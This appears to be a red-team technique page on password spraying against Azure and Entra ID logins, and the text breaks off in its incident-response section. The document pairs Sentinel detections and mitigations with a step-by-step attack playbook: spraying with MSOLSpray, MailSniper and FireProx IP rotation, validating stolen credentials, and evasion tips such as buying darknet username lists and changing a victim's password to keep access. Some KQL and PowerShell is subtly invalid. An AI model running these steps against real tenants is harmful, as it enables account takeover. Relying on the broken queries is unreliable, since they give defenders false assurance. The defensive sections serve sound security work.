# [CA-BRUTE-001]: Azure Portal Password Spray

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-BRUTE-001 |
| **MITRE ATT&CK v18.1** | [T1110.003 - Brute Force: Password Spraying](https://attack.mitre.org/techniques/T1110/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / Azure AD (All versions) |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Entra ID (all tenants), Azure Public Cloud, Azure US Government, Azure China 21Vianet, Hybrid (PHS/PTA) |
| **Patched In** | N/A (Mitigation via Smart Lockout, MFA, Conditional Access enforced as default Oct 2025) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team), 8 (Splunk Detection), and 11 (Sysmon Detection) not included because: (1) Atomic Red Team test exists but requires valid tenant access for testing, (2) Splunk is on-premises log aggregation; Azure sign-in logs are cloud-native and best analyzed via Microsoft Sentinel, (3) Sysmon doesn't capture cloud authentication events.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure portal password spray attacks target Entra ID authentication endpoints using a low-and-slow brute-force methodology. Rather than attempting multiple passwords against a single account (which triggers smart lockout), attackers spray a single weak password (e.g., "Password123!", "Winter2025", "Summer2024") across hundreds or thousands of harvested usernames. The Azure Sign-In endpoint (`login.microsoft.com`) accepts these authentication attempts, and attackers monitor responses to identify which accounts exist and which password is valid. The attack is conducted externally, requires zero organizational access, and can bypass weak conditional access policies or non-enforced MFA.

**Attack Surface:** The attack targets Microsoft Entra ID's publicly accessible authentication infrastructure:
- **Primary Endpoint:** `https://login.microsoft.com` (Azure Portal login)
- **Alternative Endpoints:** Microsoft 365 portal (`portal.office.com`), Outlook Web Access (`mail.office.com`), Azure App Service authentication
- **Detection Gap:** Azure Sign-In logs may not capture all failed attempts if conditional access or other policies filter requests early

**Business Impact:** Successful password spray results in **unauthorized access to Azure subscriptions, M365 services, cloud-stored data, and infrastructure-as-code repositories**. Compromised accounts enable lateral movement to on-premises AD (via Seamless SSO or Pass-Through Authentication), ransomware deployment, data exfiltration, and long-term persistence. Real-world APT campaigns (APT28, APT29, HAFNIUM, Peach Sandstorm) have used password spray to establish initial footholds in government, financial, and critical infrastructure organizations.

**Technical Context:** A single spray campaign can test 50-500 usernames against one password in under 10 minutes without triggering smart lockout (default threshold: 10 failed attempts per account). Distributed IP addresses evade geolocation-based detection. Attackers typically throttle attempts to 1-2 per minute per IP to avoid rate-limiting. Success rate ranges from 0.1% to 5% depending on password policy enforcement and user behavior. Detection is possible via Entra ID sign-in logs and anomaly detection but requires proper log aggregation and alerting infrastructure.

### Operational Risk
- **Execution Risk:** Very Low - Requires only basic networking knowledge, a username list (public or purchased), and common passwords; tools are freely available
- **Stealth:** Medium - Generates log entries in Azure sign-in logs but can be distributed across many IPs and days to evade pattern detection
- **Reversibility:** N/A - Successful compromise cannot be "reversed"; however, automated password resets and session revocation can mitigate

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.2.1 | Ensure that 'Enforce Multi-factor Authentication' is enabled for all user accounts in Entra ID |
| **CIS Benchmark** | CIS 2.1 | Ensure that 'Conditional Access' policies are created for user sign-in risk |
| **DISA STIG** | Windows 10/11 STIG | Require MFA for all cloud service authentication |
| **NIST 800-53** | AC-7 Unsuccessful Login Attempts | Enforce login throttling and account lockout |
| **NIST 800-53** | IA-5 Authentication | Use multi-factor authentication to counter credential-based attacks |
| **NIST 800-53** | SI-4 Information System Monitoring | Detect and alert on brute-force authentication attempts |
| **GDPR** | Art. 32 | Security of processing (strong authentication mechanisms) |
| **DORA** | Art. 9 | Protection and prevention of authentication-based attacks |
| **NIS2** | Art. 21 | Cyber Risk Management (incident response to authentication events) |
| **ISO 27001** | A.9.2.1 | User registration and de-registration |
| **ISO 27005** | Risk Scenario | "Unauthorized account compromise via credential guessing" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None (external network access only). No organizational access required.

**Required Access:** 
- Internet connectivity to `login.microsoft.com` and related Microsoft authentication endpoints
- Ability to resolve DNS and reach TCP/443 (HTTPS)
- Username list (harvested from LinkedIn, company websites, email leaks, or purchased from darknet markets)
- Single password or small password list (typically 1-5 passwords per campaign)

**Supported Versions:**
- **Entra ID:** All versions and deployment models (cloud-only, hybrid PHS, hybrid PTA)
- **Targeted Services:** Azure Portal, Microsoft 365, Office 365, SharePoint Online, Teams, Exchange Online, Power Platform
- **Geographic Variants:** Tested on Azure Public, Azure US Government, Azure China 21Vianet

**Environment Requirements:**
- **No prerequisites:** This is an external, unauthenticated attack
- **Factors affecting success:**
  - Smart Lockout threshold (default: 10 failed attempts in Azure Public)
  - MFA enforcement status (if MFA enabled on accounts, spray is less successful)
  - Conditional Access policies (if blocking based on IP/location/device, spray may fail early)
  - Password policy strength (weak password policies increase spray success)

**Tools:**
- [MSOLSpray](https://github.com/dafthack/MSOLSpray) (PowerShell, primary tool for Azure)
- [MailSniper](https://github.com/dafthack/MailSniper) (PowerShell, for Exchange/OWA/EWS spray)
- [Ruler](https://github.com/sensepost/ruler) (Go, cross-platform for Exchange spray)
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Python SMTP/OWA modules)
- [FireProx](https://github.com/ustayready/fireprox) (IP rotation via AWS API Gateway)
- Custom Python/PowerShell scripts (HTTP POST to login endpoint with credential pairs)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure/Entra ID Reconnaissance

**Gather Valid Usernames (Public Methods):**

```powershell
# Method 1: Check if company uses LinkedIn for organizational intelligence
# Domain: company.com
# Usernames typically follow: firstname.lastname@company.com OR user@company.onmicrosoft.com

# Method 2: Enumerate tenant ID from domain name
# Find Tenant ID (used for authentication flows, confirms tenant exists)
Invoke-WebRequest -Uri "https://login.microsoft.com/company.com/.well-known/openid-configuration" | Select-Object Content

# Expected output:
# Confirms tenant exists and returns OAuth endpoints
```

**Check Entra ID Smart Lockout Configuration (External Check):**

```powershell
# Cannot directly check from outside, but infer behavior by timing failed attempts
# If account locks after 10 attempts in 60 seconds, Smart Lockout is ACTIVE (default Azure Public)
# If account locks after 3 attempts, likely Azure US Government
# If no lockout after 20+ attempts, Smart Lockout may be DISABLED or custom threshold set
```

**What to Look For:**
- Username enumeration successful (usernames confirmed to exist)
- Domain confirms Entra ID usage (Tenant ID discovery)
- Smart Lockout threshold inferred (helps pace attack)

**Command (Python - Test Connectivity):**
```python
#!/usr/bin/env python3
import requests

# Test Azure login endpoint availability
response = requests.get("https://login.microsoft.com/common/oauth2/v2.0/token", timeout=5)
print(f"Azure Login Endpoint: {response.status_code}")

# If 200/400/401: Endpoint is reachable
# If 403/timeout: May be rate-limited or blocked
```

**Linux / Reconnaissance Tools:**

```bash
# Using curl to enumerate tenant
curl -s "https://login.microsoft.com/company.com/.well-known/openid-configuration" | grep -o '"issuer":"[^"]*"'

# Using nslookup to verify domain
nslookup company.onmicrosoft.com
# Should resolve to Microsoft's nameservers, confirming tenant

# Using whois to check company domain
whois company.com
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Using MSOLSpray (PowerShell - Direct Azure Spray)

**Supported Versions:** All Entra ID versions; works on Windows, Linux (via WSL), macOS

This is the most commonly used tool for Azure portal password spraying. MSOLSpray directly targets Microsoft Online Services (Entra ID) and provides built-in detection for MFA-enabled accounts.

#### Step 1: Prepare Username List

**Objective:** Collect or generate a list of valid Entra ID usernames in the format `user@company.com`.

**Command (Generate from LinkedIn Scrape):**
```bash
# Using a LinkedIn scraper tool (e.g., ScraperJS, custom script)
# This is a SIMPLIFIED example; actual LinkedIn scraping requires browser automation
cat > scrape_linkedin.py <<'EOF'
import requests
import json

# Example: Harvested usernames from company LinkedIn profile
usernames = [
    "john.smith@company.com",
    "sarah.johnson@company.com",
    "mike.williams@company.com",
    "lisa.brown@company.com",
    "david.davis@company.com"
]

with open("userlist.txt", "w") as f:
    for user in usernames:
        f.write(user + "\n")

print(f"[+] Generated {len(usernames)} usernames")
EOF

python3 scrape_linkedin.py
```

**Expected Output:**
```
$ cat userlist.txt
john.smith@company.com
sarah.johnson@company.com
mike.williams@company.com
lisa.brown@company.com
david.davis@company.com
```

**What This Means:**
- Username file created with valid email addresses in UPN format
- File should contain 100-10,000+ usernames for effective spray
- Larger lists increase success probability but increase detection risk

**OpSec & Evasion:**
- Do NOT use publicly visible scraping (may trigger LinkedIn's automated systems)
- Use purchased lists from darknet markets (lower attribution risk)
- Combine multiple sources (LinkedIn, GitHub, company domains, email leaks)
- Detection likelihood: Low (username harvesting is passive reconnaissance)

**Troubleshooting:**
- **Error:** Usernames in wrong format
  - **Cause:** UPN format expected; email format provided instead
  - **Fix:** Ensure all usernames are in format `user@company.com` or `user@company.onmicrosoft.com`

#### Step 2: Download and Import MSOLSpray

**Objective:** Install MSOLSpray tool on attack system.

**Command (Download from GitHub):**
```bash
# Clone MSOLSpray repository
git clone https://github.com/dafthack/MSOLSpray.git
cd MSOLSpray

# List available functions
ls -la
# Expected files: MSOLSpray.ps1, README.md, etc.
```

**Command (PowerShell - Import Module):**
```powershell
# Navigate to MSOLSpray directory
cd C:\Tools\MSOLSpray

# Import module into current PowerShell session
Import-Module .\MSOLSpray.ps1

# Verify import
Get-Command -Module MSOLSpray | Select-Object Name
# Expected output:
# Invoke-MSOLSpray
```

**Expected Output:**
```
ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        MSOLSpray                           {Invoke-MSOLSpray}
```

**What This Means:**
- MSOLSpray module is loaded and ready for execution
- Invoke-MSOLSpray function is available

**OpSec & Evasion:**
- Run from non-corporate network (home/VPN/hosting provider IP)
- Use Proxy or VPN to mask real IP address
- Consider using "Bring Your Own Device" (BYOD) laptop untracked by organization
- Detection likelihood: Low if run from external IP; High if run from corporate network

#### Step 3: Execute Password Spray

**Objective:** Send authentication requests with single password across all usernames.

**Command (Basic MSOLSpray Spray):**
```powershell
# Simple spray with single password
Invoke-MSOLSpray -UserList .\userlist.txt -Password "Winter2025" -Verbose

# Parameters:
# -UserList = Path to username file
# -Password = Single password to spray (should match password policy)
# -Verbose = Show detailed output
```

**Command (Output Results to File):**
```powershell
# Spray with results saved to file
Invoke-MSOLSpray -UserList .\userlist.txt -Password "Winter2025" -OutFile .\spray_results.txt -Verbose

# Results file will show:
# [+] VALID CREDENTIALS FOUND!!! john.smith@company.com:Winter2025
# [-] john.smith@company.com failed login
```

**Command (MFA Detection):**
```powershell
# MSOLSpray will automatically detect MFA
# Output will show:
# [!] john.smith@company.com ACCOUNT LOCKED (MFA Enabled)
# [!] sarah.johnson@company.com MFA Enabled - Spray less likely successful
```

**Expected Output (Valid Credentials Found):**
```
[*] MSOLSpray 4.0 starting...
[*] Spraying 450 accounts
[*] Spray in progress...
[+] VALID CREDENTIALS FOUND!!! john.smith@company.com:Winter2025
[+] VALID CREDENTIALS FOUND!!! mike.williams@company.com:Winter2025
[!] sarah.johnson@company.com account locked
```

**Expected Output (No Valid Credentials):**
```
[*] MSOLSpray 4.0 starting...
[*] Spraying 450 accounts
[*] Spray in progress...
[-] All authentication attempts failed
[*] Smart Lockout protection triggered after account threshold
```

**What This Means:**
- Spray executed against all usernames with single password
- Any found credentials are logged (success rate typically 0.1%-5%)
- MFA-enabled accounts are detected and flagged
- Account lockouts trigger after threshold is reached (default 10 in Azure Public)

**OpSec & Evasion:**
- Throttle spray speed (add delays between attempts) to avoid rate limiting
  ```powershell
  Invoke-MSOLSpray -UserList .\userlist.txt -Password "Winter2025" -Delay 2000
  # 2000ms delay = slower but less detectable
  ```
- Use rotating proxy list to avoid single-IP rate limiting
- Spread attack across 24-48 hours to evade anomaly detection
- Detection likelihood: Medium-High if not throttled; Low if properly paced

**Troubleshooting:**
- **Error:** "401 Unauthorized" on all attempts
  - **Cause:** Password likely correct but MFA blocking
  - **Fix:** Use MSOLSpray with MFA detection; if MFA on all accounts, try alternative attack vector
  
- **Error:** "429 Too Many Requests"
  - **Cause:** Rate limiting triggered
  - **Fix:** Increase delay between attempts: `-Delay 5000` (5-second delay)
  - **Fix (Distributed):** Use multiple IPs via proxy or VPN rotation

**References & Proofs:**
- [MSOLSpray GitHub Repository](https://github.com/dafthack/MSOLSpray)
- [Microsoft Security Blog - Password Spray Detection](https://www.microsoft.com/en-us/security/blog/)
- [MITRE ATT&CK T1110.003 Password Spraying](https://attack.mitre.org/techniques/T1110/003/)

#### Step 4: Identify Valid Credentials

**Objective:** Parse results and validate discovered credentials.

**Command (Extract Valid Credentials):**
```powershell
# Parse spray_results.txt for valid credentials
$valid = Select-String -Path .\spray_results.txt -Pattern "VALID CREDENTIALS FOUND"

# Display results
$valid | ForEach-Object {
    Write-Host "Valid: $($_.Line)" -ForegroundColor Green
}
```

**Command (Test Credentials Against Azure Portal):**
```powershell
# Verify credentials work by attempting login
$username = "john.smith@company.com"
$password = "Winter2025"

$SecurePassword = ConvertTo-SecureString $password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($username, $SecurePassword)

# Attempt to connect to Azure
try {
    Connect-AzAccount -Credential $Credential -ErrorAction Stop
    Write-Host "[+] Credentials valid! Logged in as $username" -ForegroundColor Green
    
    # Get subscriptions accessible to this account
    Get-AzSubscription | Select-Object Name, SubscriptionId
    
} catch {
    Write-Host "[-] Credentials failed: $($_.Exception.Message)" -ForegroundColor Red
}
```

**Expected Output (Valid Credentials):**
```
Account                    SubscriptionName       TenantId                             Environment
-------                    ----------------       --------                             -----------
john.smith@company.com     Production Subscription a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d    AzureCloud

SubscriptionName: Production Subscription
SubscriptionId  : a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d
```

**What This Means:**
- Credentials successfully authenticated to Azure
- Attacker now has access to Azure portal, subscriptions, and cloud resources
- Can enumerate further access, steal data, deploy malware

**OpSec & Evasion:**
- Immediately change password after verification to maintain persistent access
- Avoid suspicious activity immediately after first login (wait 24-48 hours)
- Delete/obfuscate successful credentials before exfiltrating results
- Detection likelihood: Medium (failed login followed by success is suspicious)

#### Step 5: Escalate Privileges (Post-Compromise)

**Objective:** Once valid credentials obtained, escalate to Global Admin or other privileged roles.

**Command (Check Current Roles):**
```powershell
Connect-AzAccount -Credential $Credential
Get-AzRoleAssignment -SignInName john.smith@company.com | Select-Object DisplayName, RoleDefinitionName
```

**Command (Lateral Movement - Check Accessible Subscriptions):**
```powershell
# List all subscriptions accessible to compromised account
Get-AzSubscription | Select-Object Name, Id

# Get subscriptions containing sensitive resources
Get-AzResource | Where-Object {$_.Type -like "*KeyVault*" -or $_.Type -like "*StorageAccount*"} | Select-Object Name, Type, ResourceGroupName
```

**References & Proofs:**
- [Azure Privilege Escalation Techniques](https://learn.microsoft.com/en-us/azure/role-based-access-control/best-practices)
- [Microsoft Entra ID Roles and Security](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/about-custom-roles)

---

### METHOD 2: Using MailSniper (PowerShell - Exchange/OWA Spray)

**Supported Versions:** Entra ID with Exchange Online enabled (M365)

MailSniper is a specialized tool for targeting Exchange Web Services (EWS) and Outlook Web Access (OWA) endpoints. It's useful when Azure portal is heavily protected but Exchange is accessible.

#### Step 1: Generate Username/Password List

**Objective:** Create CSV with username-password pairs (or iterate single password).

**Command:**
```powershell
# Create userpass.txt with username:password format
$userpass = @(
    "john.smith@company.com:Winter2025",
    "sarah.johnson@company.com:Winter2025",
    "mike.williams@company.com:Winter2025"
)

$userpass | Out-File -FilePath .\userpass.txt -Encoding UTF8
cat .\userpass.txt
```

**Expected Output:**
```
john.smith@company.com:Winter2025
sarah.johnson@company.com:Winter2025
mike.williams@company.com:Winter2025
```

#### Step 2: Execute MailSniper Password Spray

**Command:**
```powershell
# Download and import MailSniper
Import-Module .\MailSniper.ps1

# Spray against OWA endpoint
Invoke-MailSniper -ExchHostname mail.company.com -UserList .\userlist.txt -Password "Winter2025" -OutFile .\owa_spray_results.txt -Verbose

# Alternative: Spray against EWS endpoint (more reliable)
Invoke-MailSniper -ExchHostname outlook.office365.com -ExchangeVersion Exchange2019 -UserList .\userlist.txt -Password "Winter2025" -OutFile .\ews_spray_results.txt
```

**Expected Output:**
```
[*] MailSniper 2.0 starting...
[+] VALID CREDENTIALS FOUND!!! john.smith@company.com:Winter2025 (Mailbox accessible)
[!] sarah.johnson@company.com (MFA Enabled)
[-] mike.williams@company.com (Invalid credentials)
```

**References & Proofs:**
- [MailSniper GitHub](https://github.com/dafthack/MailSniper)
- [BlackHills InfoSec MailSniper Intro](https://www.blackhillsinfosec.com/introducing-mailsniper-a-tool-for-searching-every-users-email-for-sensitive-data/)

---

### METHOD 3: Distributed Password Spray (Multi-IP via FireProx)

**Supported Versions:** All Entra ID versions

FireProx rotates requests through AWS API Gateway, masking attacker IP and evading geolocation-based detection.

#### Step 1: Set Up FireProx

**Command:**
```bash
# Install FireProx
git clone https://github.com/ustayready/fireprox.git
cd fireprox
pip3 install -r requirements.txt

# Create API Gateway
python3 fireprox.py --url https://login.microsoft.com --region us-east-1 --access-key YOUR_AWS_KEY --secret-key YOUR_AWS_SECRET

# Expected output:
# [+] API Gateway URL: https://abc123xyz.execute-api.us-east-1.amazonaws.com/
```

#### Step 2: Spray via FireProx URL

**Command:**
```powershell
# Modify MSOLSpray to use FireProx URL
$ProxyURL = "https://abc123xyz.execute-api.us-east-1.amazonaws.com/"

# PowerShell spray via proxy
$username = "john.smith@company.com"
$password = "Winter2025"

$body = @{
    "username" = $username
    "password" = $password
} | ConvertTo-Json

$response = Invoke-WebRequest -Uri "${ProxyURL}common/oauth2/v2.0/token" -Method POST -Body $body -Proxy $ProxyURL -ProxyUseDefaultCredentials

if ($response.StatusCode -eq 200) {
    Write-Host "[+] VALID CREDENTIALS: $username"
} else {
    Write-Host "[-] Invalid: $username"
}
```

**Benefits:**
- Rotates through AWS IP addresses (bypasses rate limiting)
- Masks true attacker IP
- Difficult to block without blocking entire AWS API Gateway

**References & Proofs:**
- [FireProx GitHub](https://github.com/ustayready/fireprox)
- [FireProx Documentation](https://github.com/ustayready/fireprox#fireprox)

---

## 7. TOOLS & COMMANDS REFERENCE

### [MSOLSpray](https://github.com/dafthack/MSOLSpray)

**Version:** 4.0+  
**Minimum Version:** 2.0  
**Supported Platforms:** Windows, Linux (via WSL/PowerShell Core), macOS

**Installation:**
```bash
git clone https://github.com/dafthack/MSOLSpray.git
cd MSOLSpray
Import-Module .\MSOLSpray.ps1
```

**Usage (Simple):**
```powershell
Invoke-MSOLSpray -UserList userlist.txt -Password "Winter2025"
```

**Usage (Advanced - Throttled, with Output):**
```powershell
Invoke-MSOLSpray -UserList userlist.txt -Password "Winter2025" -OutFile results.txt -Delay 2000 -URL "https://login.microsoftonline.com"
```

### [MailSniper](https://github.com/dafthack/MailSniper)

**Version:** 2.0+  
**Minimum Version:** 1.0  
**Supported Platforms:** Windows, Linux (via WSL/PowerShell Core)

**Installation:**
```bash
git clone https://github.com/dafthack/MailSniper.git
cd MailSniper
Import-Module .\MailSniper.ps1
```

**Usage:**
```powershell
Invoke-MailSniper -ExchHostname outlook.office365.com -UserList userlist.txt -Password "Winter2025" -OutFile results.txt
```

### [FireProx](https://github.com/ustayready/fireprox)

**Version:** Latest  
**Supported Platforms:** Linux, macOS, Windows (via WSL)

**Installation:**
```bash
git clone https://github.com/ustayready/fireprox.git
cd fireprox
pip3 install -r requirements.txt
```

**Usage:**
```bash
python3 fireprox.py --url https://login.microsoft.com --region us-east-1 --access-key KEY --secret-key SECRET
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detect High Volume of Failed Sign-Ins from Single IP

**Rule Configuration:**
- **Required Table:** `SigninLogs`
- **Required Fields:** `ResultType`, `UserPrincipalName`, `IPAddress`, `ClientAppUsed`
- **Alert Severity:** High
- **Frequency:** Real-time (5-minute window)
- **Applies To Versions:** All Entra ID tenants with Sentinel

**KQL Query:**
```kusto
SigninLogs
| where ResultType != "0"  // Failed logins (0 = success)
| where ResultType in ("50055", "50056", "50057", "50076", "50079", "50085", "50097", "50158", "50161", "50168", "50173")  // Password-related failures
| where ClientAppUsed !in ("Office 365 Exchange Online", "Microsoft Exchange")  // Exclude normal exchange failures
| summarize FailureCount = count(), DistinctUsers = dcount(UserPrincipalName), DistinctPasswords = dcount_estimate(var_Exprs) by IPAddress, bin(TimeGenerated, 5m)
| where FailureCount > 20 and DistinctUsers > 5  // 20+ failures, 5+ different users = password spray pattern
| order by FailureCount desc
```

**What This Detects:**
- Single source IP (attacker) attempting to authenticate multiple different user accounts
- Pattern matches password spray (many users, single password)
- Excludes legitimate multi-user failures (e.g., service outages)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **Name:** `Detect High Volume Failed Sign-Ins from Single IP`
4. **Query:** Paste KQL above
5. **Run frequency:** Every 5 minutes
6. **Lookup window:** Last 10 minutes
7. **Alert threshold:** Greater than 1 result
8. **Incident settings:** Create incidents automatically
9. Save rule

---

### Query 2: Detect Password Spray Pattern (Many Accounts, Same Password Attempt)

**Rule Configuration:**
- **Required Table:** `SigninLogs`
- **Alert Severity:** High

**KQL Query:**
```kusto
let PasswordSprayThreshold = 15;  // Threshold for spray detection
SigninLogs
| where ResultType in ("50055", "50056", "50057", "50076")  // Invalid password result types
| summarize
    FailureCount = count(),
    DistinctUsers = dcount(UserPrincipalName),
    UserList = make_set(UserPrincipalName, 10),
    IPAddresses = make_set(IPAddress),
    FirstAttempt = min(TimeGenerated),
    LastAttempt = max(TimeGenerated),
    Duration = max(TimeGenerated) - min(TimeGenerated)
    by AppDisplayName, ClientAppUsed
| where DistinctUsers >= PasswordSprayThreshold  // 15+ users targeted
| where Duration <= 1h  // Within 1 hour = concentrated attack
| order by DistinctUsers desc
```

**What This Detects:**
- Password spray attack targeting 15+ accounts within 1 hour
- May come from multiple IPs (distributed attack)
- Pattern: many users, concentrated time window, same application

---

### Query 3: Detect Successful Login After Spray Attempt (Compromised Account)

**Rule Configuration:**
- **Required Table:** `SigninLogs`
- **Alert Severity:** Critical

**KQL Query:**
```kusto
// Find successful login from IP that previously had failures
let SprayAttempts = 
  SigninLogs
  | where ResultType != "0"  // Failed
  | where ResultType in ("50055", "50056", "50057")  // Password failures
  | summarize by IPAddress, UserPrincipalName, bin(TimeGenerated, 1h);

let SuccessfulLogins =
  SigninLogs
  | where ResultType == "0"  // Success
  | where ClientAppUsed == "Browser" or ClientAppUsed == "Azure Portal";

SprayAttempts
| join kind=inner SuccessfulLogins on IPAddress, UserPrincipalName
| where TimeGenerated1 > TimeGenerated  // Success AFTER spray attempts
| project IPAddress, UserPrincipalName, FailureTime = TimeGenerated, SuccessTime = TimeGenerated1, TimeDelta = TimeGenerated1 - TimeGenerated
```

**What This Detects:**
- Spray attack followed by successful authentication (account compromised)
- Time correlation between failures and success
- Indicator of successful credential stuffing

---

## 10. WINDOWS EVENT LOG MONITORING

### Event ID 4624 (Successful Sign-In to Azure)

**Log Source:** Azure Sign-In Logs (via Entra ID / Microsoft Sentinel), NOT local Windows Event Log

**Trigger:** Successful authentication after password spray

**Filter:**
- SigninLogs table
- ResultType == "0"
- IPAddress matches attacker range
- Unusual sign-in location/time

**Manual Configuration Steps (Enable Sign-In Logging):**
1. Go to **Azure Portal** → **Entra ID** → **Audit logs**
2. If not enabled, click **Activate auditing**
3. Wait 24 hours for logs to begin flowing to your storage account/Sentinel
4. Configure **Diagnostic Settings** → Send to Log Analytics

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Enforce Multi-Factor Authentication (MFA) for All Users**

**Objective:** MFA eliminates password spray success even if password is correct. Attacker cannot bypass MFA without account access.

**Applies To Versions:** All Entra ID

**Manual Steps (Entra ID Portal - Require MFA for All Users):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Require MFA for All Users`
4. **Assignments:**
   - **Users:** Select **All users**
   - **Cloud apps or actions:** Select **All cloud apps**
5. **Conditions:** Leave default (no exclusions except emergency access accounts)
6. **Access controls:**
   - **Grant:** Check **Require multi-factor authentication**
   - Click **Select**
7. **Enable policy:** **On**
8. Click **Create**

**Manual Steps (PowerShell - Require MFA):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Policy.Read.All", "Policy.ReadWrite.ConditionalAccess"

# Create conditional access policy requiring MFA
$policy = New-MgIdentityConditionalAccessPolicy -DisplayName "Require MFA All Users" `
  -State "enabled" `
  -Conditions @{
    users = @{ includeUsers = "All" };
    applications = @{ includeApplications = "All" };
    signInRiskLevels = "all"
  } `
  -GrantControls @{
    operator = "AND";
    builtInControls = "mfa"
  }

Write-Host "MFA Policy Created: $($policy.Id)"
```

**Impact Assessment:**
- **User Experience:** Users will be required to verify via phone, app, or other MFA method
- **Exceptions:** Consider excluding emergency access accounts (break-glass)
- **Success Rate:** Reduces password spray success to ~0% (even if password correct, MFA blocks spray)

**Validation Command:**
```powershell
Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Require MFA All Users'"
# Should return the policy with State = "enabled"
```

---

**Mitigation 2: Customize Smart Lockout Threshold (Lower = Better)**

**Objective:** Reduce failed attempts before lockout. Default is 10; lower to 5-7 to catch spray faster.

**Applies To Versions:** All Entra ID (P1+ required for customization)

**Manual Steps (Entra ID Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods** → **Password protection**
2. **Lockout threshold:** Set to **5** (instead of default 10)
3. **Lockout duration (seconds):** Set to **120** (2 minutes)
4. Click **Save**

**Expected Impact:**
- Spray will trigger lockout after 5 failures per account (instead of 10)
- Reduces window for attacker success
- May increase false positives for legitimate users with password typos

**Validation Command (PowerShell):**
```powershell
# Check current smart lockout settings
Get-MgIdentityPasswordPolicy | Select-Object SmartLockoutThreshold, SmartLockoutDurationSeconds
# Expected: SmartLockoutThreshold = 5, SmartLockoutDurationSeconds = 120
```

---

**Mitigation 3: Block Legacy Authentication Protocols**

**Objective:** Legacy protocols (SMTP, IMAP, POP3, RPC, etc.) are common targets for password spray. Blocking them eliminates entire attack vector.

**Applies To Versions:** All Entra ID

**Manual Steps (Conditional Access - Block Legacy Auth):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Legacy Authentication`
4. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** All cloud apps
5. **Conditions:**
   - Click **Client apps** → Toggle **On**
   - Select: **Exchange ActiveSync clients**, **Other clients**, **IMAP**, **MAPI**, **POP**, **SMTP**
6. **Access controls:**
   - **Grant:** Select **Block access**
   - Click **Select**
7. **Enable policy:** **On**
8. Click **Create**

**Impact:**
- Blocks older mail clients, mobile apps, and IoT devices using legacy auth
- Forces modern authentication (OAuth, SAML, MFA-aware)
- May break compatibility with some older applications

**Validation Command:**
```powershell
# Verify legacy auth block is active
Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Block Legacy Authentication'" | Select-Object State, DisplayName
```

---

### Priority 2: HIGH

**Mitigation 4: Implement Risk-Based Conditional Access**

**Objective:** Automatically block or require MFA for suspicious sign-ins (unusual location, time, device).

**Manual Steps:**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy** → **Create new**
3. **Name:** `Block High-Risk Sign-Ins`
4. **Assignments:**
   - **Users:** All users
   - **Cloud apps:** All cloud apps
5. **Conditions:**
   - **Sign-in risk:** Select **High**
6. **Access controls:**
   - **Grant:** Select **Block access**
7. Click **Create**

---

**Mitigation 5: Monitor and Alert on Sign-In Failures**

**Objective:** Create alerts for spray patterns so SOC can respond.

**Manual Steps (Microsoft Sentinel Query):**
```kusto
// Alert on potential password spray
SigninLogs
| where ResultType != "0"
| summarize FailureCount = count() by IPAddress, bin(TimeGenerated, 5m)
| where FailureCount > 20
| alert Severity="High" Name="Potential Password Spray Detected"
```

---

### Priority 3: MEDIUM

**Mitigation 6: Restrict IP Ranges via Conditional Access**

**Objective:** Allow access only from known geographic locations or IP ranges.

**Manual Steps:**
1. Go to **Conditional Access** → **+ New policy**
2. **Name:** `Restrict Access to Known IPs`
3. **Conditions:**
   - **Locations:** Select **Any location** → **Exclude:** Select your country/regions
4. **Access controls:**
   - **Grant:** **Block access**
5. Click **Create**

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network:**
- Outbound authentication requests from external IP to `login.microsoft.com`
- Multiple failed logon attempts (Event 4625) clustered in time from single source IP
- Large number of failed attempts across different user accounts from same IP (5+ users, 5+ failures in < 10 minutes)

**Behavioral:**
- Successful login immediately after spray attempts from same IP
- Sign-in from geographically impossible location (e.g., user in US signs in from Russia within 2 hours)
- Sign-in outside normal business hours with no prior pattern
- Sudden change in user access patterns (accessing resources not previously touched)

### Forensic Artifacts

**Cloud Logs (Microsoft Sentinel / Entra ID):**
- `SigninLogs` table: Failed and successful authentication attempts
- `AuditLogs` table: Account modifications post-compromise
- `CloudAppEvents` table: Data access or exfiltration post-compromise

**Timing Analysis:**
- Failed attempts cluster (5-20 within seconds = spray)
- Followed by successful login = credential confirmation

**IP Analysis:**
- Multiple IPs = distributed attack or proxy rotation
- Single IP = simpler attack, easier to block

### Response Procedures

**1. Immediate Containment**

**Command (Force Password Reset for Compromised Account):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "User.ManagementWrite.All"

# Get compromised user
